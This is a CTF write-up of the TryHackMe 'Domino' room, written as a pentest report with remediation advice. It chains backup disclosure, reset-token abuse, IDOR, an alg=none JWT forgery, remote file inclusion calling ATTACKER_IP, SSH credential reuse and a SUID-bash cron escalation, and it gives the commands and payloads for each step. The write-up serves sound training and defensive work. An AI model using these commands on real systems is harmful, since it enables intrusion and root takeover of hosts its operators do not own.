---
title: "TryHackMe: Domino"
date: 2026-06-27 23:55:00 +0200
categories: [TryHackMe]
tags:
  - web
  - php
  - backup-disclosure
  - password-reset
  - idor
  - jwt
  - rfi
  - rce
  - ssh
  - privilege-escalation
description: >-
  Domino chained exposed backups, client-side key disclosure, password-reset
  abuse, IDOR, JWT signature bypass, remote file inclusion, credential reuse,
  and a writable root-executed script into full host compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_domino
image:
  path: room_image.webp
  alt: "Original TryHackMe Domino room artwork"
toc: true
comments: false
---

Domino is a cascading web-to-root compromise against the NexusCorp Employee Portal. The validated attack path began with an exposed backup directory and client-side encryption key, progressed through account takeover and authorization weaknesses, reached PHP remote code execution through an admin file API, and ended with SSH lateral movement plus abuse of a writable root-executed monitoring script.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Domino room card](room_card.webp){: w="296" h="272" .shadow }](https://tryhackme.com/room/domino){: .center }

## Executive Summary

The target exposed a PHP/Apache employee portal and SSH:

```text
22/tcp  OpenSSH
80/tcp  Apache / PHP
```

The compromise succeeded because several individually moderate weaknesses formed a complete chain:

```text
Directory listing
-> encrypted backup disclosure
-> client-side AES key disclosure
-> password-reset abuse
-> authenticated IDOR
-> forged admin JWT using alg=none
-> remote file inclusion + eval()
-> PHP RCE
-> credential reuse to SSH
-> writable root-executed script
-> root
```

> **Result:** All five challenge objectives were recovered and the Linux host was fully compromised.
{: .prompt-danger }

## Initial Enumeration

The target can be represented without publishing the lab address:

```console
$ nmap -p22,80 -sV -sC -T4 -Pn TARGET_IP
```

Web content enumeration identified application areas including login, API, backup, admin, support, static assets, and password-reset functionality.

## Exposed Backup Directory

Directory listing under `/backup/` exposed:

```text
README.txt
config.enc
```

The README described `config.enc` as an AES-128-ECB encrypted application configuration and pointed to a client-side JavaScript file for the decryption key.

This meant backup confidentiality depended on a secret delivered to every unauthenticated browser.

### F-01 - Directory Listing and Exposed Backup Configuration

- **Severity:** Medium
- **Impact:** Sensitive deployment material became publicly downloadable

**Remediation:**

- disable directory indexing;
- keep backups outside the document root;
- prevent anonymous backup downloads;
- encrypt backups with server-side managed keys.

## Client-Side Encryption Key Disclosure

The referenced JavaScript file disclosed the backup key:

```javascript
_backupKey: '[REDACTED]'
```

After padding the disclosed value as documented and decrypting the backup, the resulting configuration identified:

```json
{
  "app_name": "NexusCorp Portal",
  "version": "2.3.1",
  "deploy_env": "production",
  "system_user": "devops"
}
```

### F-02 - Client-Side Disclosure of Backup Encryption Key

- **Severity:** Medium
- **Impact:** Defeated backup encryption and exposed operational identity information

**Remediation:**

- never ship encryption keys to browsers;
- rotate disclosed secrets;
- use authenticated encryption such as AES-GCM;
- keep keys in server-side secrets management.

## Password Reset Abuse

The password-reset API returned reset tokens for non-admin users. The reset endpoint then accepted a valid token to change the password of a non-admin account.

A representative flow was:

```console
$ curl -s -X POST \
  http://TARGET_IP/api/reset.php \
  -H 'Content-Type: application/json' \
  -d '{"username":"robert.wilson"}'
```

The returned token is redacted:

```text
token=[REDACTED]
```

The account password was then changed to a tester-controlled value, also redacted:

```console
$ curl -X POST \
  "http://TARGET_IP/reset.php?token=[REDACTED]" \
  -d 'username=robert.wilson&password=[REDACTED]'
```

### F-03 - Password Reset Logic Flaw and Token Disclosure

- **Severity:** High
- **Impact:** Unauthenticated takeover of ordinary employee accounts

**Remediation:**

- never return reset tokens through the API;
- bind reset tokens to the requested identity;
- enforce single-use and short expiry;
- deliver reset tokens out of band.

## IDOR in User Profile API

After authenticating as `robert.wilson`, the profile API allowed arbitrary user IDs:

```text
/api/users/profile.php?id=1
```

Requesting the administrator profile returned sensitive notes belonging to `laura.hayes`.

The recovered challenge value is redacted:

```text
THM{[REDACTED]}
```

### F-04 - IDOR in User Profile API

- **Severity:** High
- **Impact:** Cross-user profile disclosure including administrator data

**Remediation:**

- enforce object-level authorization on every profile request;
- do not treat authentication alone as authorization;
- restrict normal users to their own records unless explicitly delegated.

## JWT Signature Verification Bypass

Application source showed that JWT payloads were decoded without enforcing signature verification.

A token with an `alg=none` header and administrator claims could therefore be accepted:

```json
{
  "sub": "devops",
  "role": "admin",
  "is_admin": true
}
```

The complete forged token is not published.

The forged role granted access to:

```text
/admin/
/api/files.php
```

The admin-panel objective was recovered and is redacted:

```text
THM{[REDACTED]}
```

### F-05 - JWT Signature Verification Disabled

- **Severity:** Critical
- **Impact:** Administrative access without administrator credentials

**Remediation:**

- require cryptographic signature verification;
- reject `alg=none`;
- validate issuer, audience, and expiry;
- resolve authorization roles server-side rather than trusting client claims.

## Remote File Inclusion and `eval()` RCE

The administrative file endpoint accepted remote URLs, retrieved content using `file_get_contents()`, and executed the returned content with `eval()`.

A controlled PHP payload was hosted from the attacker system:

```php
echo file_get_contents('/opt/flag3.txt');
```

The request can be represented as:

```console
$ curl -G \
  http://TARGET_IP/api/files.php \
  -H 'Authorization: Bearer [REDACTED]' \
  --data-urlencode \
  "name=http://ATTACKER_IP:8001/flag3.txt"
```

The endpoint executed the PHP payload server-side, producing the third challenge objective:

```text
THM{[REDACTED]}
```

### F-06 - Remote File Inclusion with `eval()` in File API

- **Severity:** Critical
- **Impact:** Arbitrary PHP execution on the server

**Remediation:**

- remove `eval()`;
- prohibit remote URL fetching in file-viewing functionality;
- apply strict allowlists;
- disable `allow_url_fopen` where appropriate;
- treat viewed files strictly as data.

## Credential Reuse to SSH

Application configuration later exposed a reusable application password:

```text
DB_PASS=[REDACTED]
```

The same password authenticated the Linux `devops` account:

```console
$ ssh devops@TARGET_IP
Password: [REDACTED]
```

The `devops` home directory contained the fourth challenge objective:

```text
THM{[REDACTED]}
```

### F-07 - Credential Reuse Enabled SSH Lateral Movement

- **Severity:** High
- **Impact:** Application compromise became operating-system shell access

**Remediation:**

- use unique credentials for database, application, and system identities;
- rotate all exposed credentials;
- disable password-based SSH where feasible;
- apply least privilege to application accounts.

## Writable Root-Executed Monitoring Script

Local privilege-escalation enumeration identified:

```text
/opt/monitoring/health_report.sh
```

The script was writable by `devops` but executed every minute as root.

Replacing or modifying the script allowed root to create a SUID shell:

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
cat /root/root.txt > /tmp/rootflag 2>/dev/null
```

After the scheduled execution:

```console
$ /tmp/rootbash -p
# id
uid=0(root) gid=0(root) groups=0(root)
```

The final root objective is redacted:

```text
THM{[REDACTED]}
```

### F-08 - Writable Root-Executed Monitoring Script

- **Severity:** Critical
- **Impact:** Full root compromise

**Remediation:**

- make root-executed scripts root-owned and non-writable by normal users;
- audit cron jobs and scheduled system tasks;
- monitor integrity of `/opt` operational scripts;
- avoid writable directories in privileged execution paths.

## Security Impact

The critical issue in Domino was the accumulation of trust failures:

- backups were public;
- their encryption key was public;
- password reset exposed tokens;
- profile authorization was object-level insecure;
- JWT verification trusted unsigned claims;
- a file viewer executed fetched remote content;
- application credentials were reused for SSH;
- a root-executed script was writable by a non-root user.

Together these weaknesses enabled complete compromise from unauthenticated web access to root.

## Remediation Priorities

1. Fix JWT verification and reject unsigned tokens.
2. Remove remote fetching and `eval()` from the file API.
3. Correct ownership and permissions on root-executed scripts.
4. Rotate all application, database, and system credentials.
5. Remove backups and encryption keys from public web content.
6. Repair password-reset token handling.
7. Enforce object-level authorization in profile APIs.
8. Disable password-based SSH where possible.
9. Add integrity monitoring for scheduled scripts and web-root changes.

## Retest Plan

1. Confirm `/backup/` is no longer browsable or anonymously downloadable.
2. Verify no backup encryption keys are present in client-side assets.
3. Confirm reset tokens are not returned to unauthenticated callers.
4. Verify users cannot reset unrelated accounts.
5. Confirm profile IDOR requests are blocked.
6. Verify `alg=none` and unsigned JWTs are rejected.
7. Confirm `/api/files.php` cannot retrieve or execute remote content.
8. Verify exposed application passwords no longer authenticate SSH.
9. Confirm `health_report.sh` is root-owned and not writable by `devops`.
10. Verify the documented chain can no longer produce root access.

## Lessons Learned

Domino shows how a series of weaknesses can behave exactly like falling pieces: each issue enables the next one.

None of the early findings alone provided root access. The risk emerged because public backup material, broken authentication flows, authorization failures, dangerous code execution behavior, credential reuse, and weak host permissions were allowed to connect without effective defensive boundaries.

Breaking any critical link in that chain would have substantially reduced the final impact.
